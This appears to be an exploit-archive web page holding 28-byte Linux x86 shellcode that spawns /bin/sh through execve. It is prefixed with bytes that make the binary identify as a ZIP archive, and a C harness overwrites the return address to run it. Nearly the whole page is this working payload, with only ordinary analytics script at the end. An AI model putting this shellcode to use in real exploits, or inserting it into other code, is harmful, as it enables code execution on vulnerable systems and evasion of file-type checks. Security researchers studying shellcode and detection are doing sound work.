<html><head><title>Linux/x86 - execve(/bin/sh, [/bin/sh, NULL]) + ZIP Header - 28 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) - execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL]) + ZIP Header - 28 bytes
 *
 * root@magicbox:~# file linux-sh-ziphdr.bin
 * linux-sh-ziphdr.bin: Zip archive data
 *
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	//
	// ZIP Header (5 bytes)
	//

	&quot;\x50&quot;                  // push %eax 
	&quot;\x4b&quot;                  // dec %ebx 
	&quot;\x03\x04\x24&quot;          // add (%esp),%eax 

	//
	// execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL]);
	//

	&quot;\x6a\x0b&quot;              // push $0xb 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x99&quot;                  // cltd 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x68\x2f\x2f\x73\x68&quot;  // push $0x68732f2f 
	&quot;\x68\x2f\x62\x69\x6e&quot;  // push $0x6e69622f 
	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
	&quot;\x52&quot;                  // push %edx 
	&quot;\x53&quot;                  // push %ebx 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 
	&quot;\xcd\x80&quot;;             // int $0x80 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
